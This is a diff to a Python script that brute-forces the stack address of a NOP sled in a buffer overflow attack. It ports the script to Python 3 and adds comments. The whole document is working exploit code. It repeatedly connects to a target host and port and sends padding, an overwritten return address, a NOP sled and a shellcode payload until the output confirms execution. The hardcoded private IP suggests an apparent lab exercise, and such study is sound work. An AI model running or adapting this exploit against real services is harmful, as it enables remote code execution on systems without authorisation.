@@ -4,24 +4,27 @@
 # because the funnest part is when you go down the slide
 #
 # Brute force find the address on the stack where the NOP sled is.
-# This found address is the value you overwrite the return address with
+# This found address is the value you overwrite the return address with.
 # This address will be either the start of the shellcode or
 # somewhere in the NOP slide
 #
 # By CLonsdale
 #
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 # WARNING, since the test payload may be shorter than the actual payload
 # The address you get back may need to be subtracted to ensure you start
 # at the beginning of the payload
+# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
 import socket
+import struct
 import time
 
 # Network Parameters
 ####################################################
 IP = "172.16.59.128"
 PORT = 5004
-###################################################
+####################################################
 
 # Hack parameters
 ####################################################
@@ -31,49 +34,40 @@ GARBAGE_SIZE = 48
 ####################################################
 
 NOP = b"\x90"
-ADDRESS_LENGTH = 4
+ADDRESS_LENGTH = 4 # bytes
 SLED_SIZE = BUF_SIZE - len(PAYLOAD) - GARBAGE_SIZE - ADDRESS_LENGTH
-GARBAGE = "A" * GARBAGE_SIZE
+GARBAGE = b"A" * GARBAGE_SIZE
 NOP_SLED = NOP * SLED_SIZE
 
-# Loop through addresses with a prefix, going from start to end
-# increasing by step each time
+# Depending on your position in the stack, you might want to go from 0xffffffff down to 0xffff0000
+# instead of the current way, in which case, you can change the start and end addresses
+# and step needs to be a negative number
 #
-# prefix is ffff by default
-# start is 0 by default (decimal)
-# end is (16**4 - 1) by default
-# step is SLED_SIZE by default
-
-# Depending on your position in the stack, you might want to go from 0xffff down to 0x0000
-# instead of the current way which is 0x0000 to 0xffff
-# YOU WILL NEED TO MAKE STEP A NEGATIVE NUMBER IN THAT CASE
-#
-def bruteForceAddress(output_validation, prefix="ffff", start=0, end=(16**4 -1), step=SLED_SIZE, debug=False):
+def bruteForceAddress(output_validation, start=0xffff0000, end=0xffffffff, step=SLED_SIZE, debug=False):
     for addr in range(start, end, step):
-        # Cut and paste the address into little endian format
-        addr_hex = format(addr, '04x')
-        addr_hex = addr_hex[2:] + addr_hex[:2] + prefix
-        address = addr_hex.decode('hex')
+        # Convert address to little-endian
+        address = struct.pack('<I', addr)
 
         exploit = GARBAGE + address + NOP_SLED + PAYLOAD
 
         sock = socket.create_connection((IP, PORT))
-        # This will need to be changed depending on the program youre trying to hack
-        sock.recv(1024)
+
+        # This will need to be changed depending on the program you're trying to hack
+        sock.recv(1024) # Recv the input prompt
         sock.sendall(exploit)
-        sock.recv(1024)
-        output = sock.recv(1024)
+        sock.recv(1024) # Recv error message
+        output = sock.recv(1024) # Recv our exploits output
 
         if debug: 
-            print (prefix + format(addr, '04x'))
+            # Debug in big-endian
+            print(format(addr, '0x'))
 
         if output.startswith(output_validation):
-            # This is in little endian form
-            return addr_hex
+            return "\\x" + "\\x".join(format(byte, '0x') for byte in address)
 
         # Depending on the program, the time may need to be adjusted
         time.sleep(2.25)
 
 if __name__ == "__main__":
     # Takes 4 mins to run
-    print bruteForceAddress("yeh")
+    print(bruteForceAddress(b"yeh"))
